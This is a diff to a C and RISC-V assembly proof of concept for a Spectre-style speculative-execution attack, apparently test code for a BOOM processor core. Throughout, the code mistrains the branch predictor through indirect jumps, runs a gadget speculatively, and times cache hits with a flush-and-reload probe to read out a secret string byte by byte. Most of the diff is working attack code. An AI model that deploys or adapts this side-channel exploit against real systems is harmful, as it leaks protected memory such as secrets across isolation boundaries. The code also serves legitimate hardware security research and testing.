@@ -1,33 +1,21 @@
 #include <stdio.h>
 #include <stdint.h> 
+#include "encoding.h"
 #include "cache.h"
 
-#define TRAIN_TIMES 30 // emperically chosen value for successful mistraining
+//#define TRAIN_TIMES 6 // assumption is that you have a 2 bit counter in the predictor
+#define TRAIN_TIMES 40 // assumption is that you have a 3 bit counter in the predictor
 #define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
 #define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
-#define SECRET_SZ 23
+#define SECRET_SZ 31
 #define CACHE_HIT_THRESHOLD 50
-
-#define CACHE_FLUSH_ITERATIONS 2048
-#define CACHE_FLUSH_STRIDE 4096
-
-#define ARRAY_STRIDE L1_BLOCK_SZ_BYTES
-
-uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];
-
 
 uint64_t array1_sz = 16;
 uint8_t unused1[64];
-uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
+uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t unused2[64];
-uint8_t array2[256 * ARRAY_STRIDE]; //probe (attacker) array
-char* secretString = "!\"#SecretInTheSonicBOOM";
-
-#define write_chickcsr(val) ({ asm volatile ("csrwi 0x8c1, %0" :: "rK"(val)); })
-
-#define read_csr(reg) ({ unsigned long __tmp; \
-  asm volatile ("csrr %0, " #reg : "=r"(__tmp)); \
-  __tmp; })
+uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
+char* secretString = "!\"#ThisIsTheBabySonicBoomerTest";
 
 /**
  * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
@@ -57,9 +45,6 @@ void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, ui
     }
 }
 
-
-uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
-
 /**
  * on the victim run this should be the function that should run. what should happen is that during the attack run
  * the victimFunc should run speculatively (it is the gadget) then the wantFunc should run
@@ -75,31 +60,17 @@ void wantFunc(){
  * @input idx input to be used to idx the array
  */
 void victimFunc(uint64_t idx){
-    temp &= array2[array1[idx] * ARRAY_STRIDE];
+    uint8_t dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
 }
 
 int main(void){
     uint64_t wantAddr = (uint64_t)(&wantFunc); 
     uint64_t victimAddr = (uint64_t)(&victimFunc);
-    uint64_t passInAddr, passInIdx, randIdx, mix_i;    
+    uint64_t start, diff, passInAddr;
     uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
-    register uint64_t start, diff;
-    unsigned int dummy = 0;
+    uint64_t passInIdx, randIdx;
+    uint8_t dummy = 0;
     static uint64_t results[256];
-    volatile uint8_t * addr;    
-
-    int junk2 = 0;
-    int l;
-    (void)junk2;
-    
-    for (int i = 0; i < (int)sizeof(cache_flush_array); i++) {
-      cache_flush_array[i] = 1;
-    }
-    
-    
-    for (int i = 0; i < (int)sizeof(array2); i++) {
-      array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
-    }    
 
     // try to read out the secret
     for(uint64_t len = 0; len < SECRET_SZ; ++len){
@@ -113,26 +84,9 @@ int main(void){
         for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
 
             // make sure array you read from is not in the cache
-            //flushCache((uint64_t)array2, sizeof(array2));
+            flushCache((uint64_t)array2, sizeof(array2));
 
-            randIdx = atkRound % array1_sz;
-
-            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-2; j >= 0; --j){
-            //for(int64_t j = 29; j >= 0; --j){    
-
-				//make sure array you read from is not in the cache
-                for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
-                  junk2 = cache_flush_array[l];
-                }
-                                
-
-                /* Delay (act as mfence) */      
-				// set of constant takens to make the BHR be in a all taken state				
-                for(volatile int k = 0; k < 30; ++k){
-                    asm("");
-                }
-                
-                                
+            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
                 // bit twiddling to set (passInAddr, passInIdx)=(victimAddr, randIdx) or (wantAddr, attackIdx) after TRAIN_TIMES iterations
                 // avoid jumps in case those tip off the branch predictor
                 // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
@@ -140,18 +94,17 @@ int main(void){
                 passInAddr = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInAddr=...FFFF0000 else 0
                 passInAddr = (passInAddr | (passInAddr >> 16)); // set the passInAddr=-1 or 0
                 passInAddr = victimAddr ^ (passInAddr & (wantAddr ^ victimAddr)); // select victimAddr or wantAddr 
-               
+
+                randIdx = atkRound % array1_sz;
                 passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                 passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                 passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
 
                 // set of constant takens to make the BHR be in a all taken state
-                /* Delay (act as mfence) */                
-                // for(volatile int k = 0; k < 100; ++k){
-                //     asm("");
-                // }
+                for(uint64_t k = 0; k < 100; ++k){
+                    asm("");
+                }
 
-                // this calls the function using jalr and delays the addr passed in through fdiv
                 // this calls the function using jalr and delays the addr passed in through fdiv
                 asm("addi %[addr], %[addr], -2\n"
                     "addi t1, zero, 2\n"
@@ -171,31 +124,19 @@ int main(void){
                     : "t1", "t2", "fa4", "fa5");
             }
             
-            // read out array 2 and see the hit secret value            
-            /* Time reads. Order is lightly mixed up to prevent stride prediction */
-            for (int i = 0; i < 256; i++) {
-                mix_i = ((i * 167) + 13) & 255;
-                addr = & array2[mix_i * ARRAY_STRIDE];
-                //addr = & array2[mix_i * 4096];
-                
-                /*
-                We need to accuratly measure the memory access to the current index of the
-                array so we can determine which index was cached by the malicious mispredicted code.
-                The best way to do this is to use the read_csr instruction, which measures current
-                processor ticks, and is also serialized.
-                */                             
-                start = read_csr(cycle); /* READ TIMER */
-                dummy = * addr; /* MEMORY ACCESS TO TIME */
-                diff = (read_csr(cycle) - start); /* READ TIMER & COMPUTE ELAPSED TIME */
-                
-                if ((uint64_t)diff < CACHE_HIT_THRESHOLD && mix_i != array1[atkRound % array1_sz]){
-                  results[mix_i]++; /* cache hit - add +1 to score for this value */
-                }            
+            // read out array 2 and see the hit secret value
+            // this is also assuming there is no prefetching
+            for (uint64_t i = 0; i < 256; ++i){
+                start = rdcycle();
+                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
+                diff = (rdcycle() - start);
+                if ( diff < CACHE_HIT_THRESHOLD ){
+                    results[i] += 1;
+                }
             }
         }
         
         // get highest and second highest result hit values
-        results[0] ^= dummy; /* use junk so code above wont get optimized out*/
         uint8_t output[2];
         uint64_t hitArray[2];
         topTwoIdx(results, 256, output, hitArray);
